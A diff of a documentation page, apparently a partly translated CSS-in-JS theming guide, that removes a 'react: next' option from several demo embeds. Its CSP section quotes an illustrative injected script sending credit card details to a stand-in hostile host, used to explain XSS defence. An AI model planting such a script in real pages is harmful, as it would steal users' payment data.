@@ -6,7 +6,7 @@
 
 Add a `ThemeProvider` to the top level of your app to access the theme down the React's component tree. Then, you can access the theme object in the style functions.
 
-{{"demo": "pages/css-in-js/advanced/Theming.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/Theming.js"}}
 
 ## Accessing the theme in a component
 
@@ -14,11 +14,11 @@ You might need to access the theme variables inside your React components.
 
 ### `useTheme` hook
 
-{{"demo": "pages/css-in-js/advanced/UseTheme.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/UseTheme.js"}}
 
 ### `withTheme` HOC
 
-{{"demo": "pages/css-in-js/advanced/WithTheme.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/WithTheme.js"}}
 
 ## Theme nesting
 
@@ -33,7 +33,7 @@ You can nest multiple theme providers. This can be really useful when dealing wi
 </ThemeProvider>
 ```
 
-{{"demo": "pages/css-in-js/advanced/ThemeNesting.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}
 
 The inner theme will **override** the outer theme. You can extend the outer theme by providing a function:
 
@@ -98,7 +98,7 @@ const useStyles = makeStyles({
 });
 ```
 
-{{"demo": "pages/css-in-js/advanced/StringTemplates.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/StringTemplates.js"}}
 
 ## Ordem de injeção de CSS
 
@@ -269,7 +269,7 @@ Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring develop
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-    
+
 
 This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
 
